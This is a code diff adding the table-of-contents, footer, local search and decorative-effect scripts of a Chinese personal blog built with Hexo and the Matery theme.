+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="tencent"
+                   type="playlist"
+                   id="7413239070"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.5'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2025</span>
+            
+            <span id="year">2022</span>
+            <a href="/about" target="_blank">坂琴</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">81.3k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+			
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2022";
+                        var startMonth = "1";
+                        var startDate = "20";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+                <span id="icp"><img src="/medias/icp.png"
+                                    style="vertical-align: text-bottom;"/>
+                <a href="https://www.beian.gov.cn/portal/registerSystemInfo?recordcode=50011802010852" target="_blank">渝公网安备 50011802010852号</a>&nbsp;&nbsp;|&nbsp;&nbsp; 
+				<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">渝ICP备2023009623号</a>
+            </span>
+		 
+			
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/SukiTakagisan" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2125760270@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/Takagis97136578" class="tooltipped" target="_blank" data-tooltip="博主的推特: https://twitter.com/Takagis97136578" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2125760270" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2125760270" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+    <a href="https://www.zhihu.com/people/yu-qi-cai-hong-mao" class="tooltipped" target="_blank" data-tooltip="博主的知乎: https://www.zhihu.com/people/yu-qi-cai-hong-mao" data-position="top" data-delay="50">
+        <i class="fab fa-zhihu1">知</i>
+    </a>
+
+
+<!-- 
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+ -->
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+		 	
+		 
+
+
+
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+    
+    <!-- 爆炸效果 -->
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <!-- 樱花飘落 -->
+    <script type="text/javascript">
+        //只在桌面版网页启用特效
+        var windowWidth = $(window).width();
+        if (windowWidth > 768) {
+            document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+        }
+    </script>
+
+    <!--崩溃欺骗-->
+    <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+</body>
+
+</html>
